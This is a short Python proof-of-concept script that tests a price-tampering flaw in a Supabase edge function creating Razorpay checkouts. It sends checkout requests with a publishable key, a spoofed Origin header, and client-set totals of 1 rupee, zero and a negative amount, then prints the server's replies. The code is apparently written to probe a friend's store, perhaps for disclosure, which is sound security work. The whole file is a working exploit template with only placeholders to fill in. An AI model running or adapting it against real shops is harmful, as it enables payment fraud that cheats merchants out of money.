"""
POC 2: client-controlled pricing in checkout
"""

import uuid

import requests

ENDPOINT = "https://<PROJECT>.supabase.co/functions/v1/create-razorpay-checkout"
KEY = "<PUBLISHABLE_KEY>"

HEADERS = {
    "Authorization": f"Bearer {KEY}",
    "apikey": KEY,
    "Content-Type": "application/json",
    "Origin": "https://<FRIEND_DOMAIN>",
}


def attempt(total, item_price):
    return requests.post(
        ENDPOINT,
        headers=HEADERS,
        json={
            "customer_id": "<CUSTOMER_ID>",
            "store_id": "<STORE_ID>",
            "total_amount": total,
            "shipping_amount": 0,
            "items": [
                {
                    "product_id": "<PRODUCT_ID>",
                    "product_name": "Test",
                    "quantity": 1,
                    "price": item_price,
                    "variants": {},
                }
            ],
            "idempotency_key": str(uuid.uuid4()),
        },
        timeout=10,
    )


def main():
    cases = [
        ("legit", 86500, 865),
        ("rupee 1", 100, 1),
        ("free", 0, 0),
        ("negative", -100, -100),
    ]
    for label, total, price in cases:
        r = attempt(total, price)
        print(f"  [{r.status_code}] {label:10s}  {r.text[:90]}")


if __name__ == "__main__":
    main()